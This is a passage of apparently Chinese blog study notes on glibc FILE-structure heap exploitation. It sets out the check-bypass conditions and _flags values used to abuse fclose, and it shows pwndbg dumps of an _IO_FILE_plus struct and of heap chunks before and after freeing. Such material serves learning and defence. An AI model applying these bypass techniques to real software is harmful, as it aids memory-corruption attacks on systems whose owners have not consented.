class=&#34;comment&#34;&gt;//这里我并不清楚这些绕过都是什么，待后续学习&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;((fp-&amp;gt;_mode &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; fp-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_IO_write_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//或者是&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_vtable_offset (fp) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;&amp;amp; fp-&amp;gt;_mode &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;&amp;amp; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;amp;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; and flag &amp;amp;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; =&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; and flag &amp;amp; &lt;span class=&#34;number&#34;&gt;0x8000&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;所以flag的值可以为&lt;span class=&#34;number&#34;&gt;0xfbad8000&lt;/span&gt; 或者&lt;span class=&#34;number&#34;&gt;0xfbad8080&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;//unlink与io_FILE_plus 联合使用https://www.jianshu.com/p/1e45b785efc1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在执行 fclose 时会执行 unlink 等一些操作，同时会 free 我们开启的 fp 堆块以及储存数据的堆块，如果因为这两个堆块都比较大，检查是否与 topchunk 相邻，然年进行 free, 因为储存数据的堆块与 topchunk 相连，而且其在 file 堆块前释放，所以两个都会合并到 topchunk.fclose 会对 file_plus 的数据进处理&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *)&lt;span class=&#34;number&#34;&gt;0x804c410&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-72539124&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0xf7fb7cc0&lt;/span&gt; &amp;lt;_IO_2_1_stderr_&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x804c4a8&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x804c4b4&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;39&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0xf7fb6ac0&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;继续我们上述的绕过检查，我们修改其的相关参数后释放&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804c408&lt;/span&gt; PREV_INUSE &amp;#123;					&lt;span class=&#34;comment&#34;&gt;//IO_FILE_plus 堆块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;353&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;0xf7fb77b0&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk = &lt;span class=&#34;number&#34;&gt;0xf7fb77b0&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd_nextsize = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk_nextsize = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804c568&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_size = &lt;span class=&#34;number&#34;&gt;352&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;4104&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;0x61616161&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk = &lt;span class=&#34;number&#34;&gt;0x61616161&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd_nextsize = &lt;span class=&#34;number&#34;&gt;0x61616161&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk_nextsize = &lt;span class=&#34;number&#34;&gt;0xa6161&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804d570&lt;/span&gt; PREV_INUSE &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;129681&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd_nextsize = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk_nextsize = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *)&lt;span class=&#34;number&#34;&gt;0x804c410&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-134514768&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0xf7fb77b0&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;p\325\004\b&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x804d570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0xf7fb7cc0&lt;/span&gt; &amp;lt;_IO_2_1_stderr_&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x804c4a8&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x804c4b4&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;39&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0xf7fb6ac0&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，此时只是对 file 堆块进行了释放，而没有对其数据进行清空，io_read_ptr 变为了 main_arena, 这是因为其加入了 unsortedbins, 但是这块是或否执行了 unlink 操作呢？但是我们看到了储存数据的堆块并没有进行 free 操作。这里这样操作，如果存在 UAF 是否可以实现泄露数据呢？&lt;/p&gt;
